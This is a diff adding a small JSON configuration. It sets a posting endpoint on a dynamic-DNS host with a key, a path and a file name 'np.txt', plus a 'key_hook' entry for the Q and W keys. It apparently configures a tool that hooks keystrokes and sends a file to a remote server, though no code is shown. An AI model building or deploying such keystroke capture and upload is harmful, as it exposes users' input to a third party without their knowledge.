@@ -1,0 +1,15 @@
+{
+	"np": {
+		"post": {
+			"key": "lnpv4wbwl5oq",
+			"host": "nt5.hopto.org:8090",
+			"url": "/pyhelper"
+		},
+		"file": {
+			"name": "np.txt"
+		}
+	},
+	"key_hook": {
+		"keys": ["Q", "W"]
+	}
+}
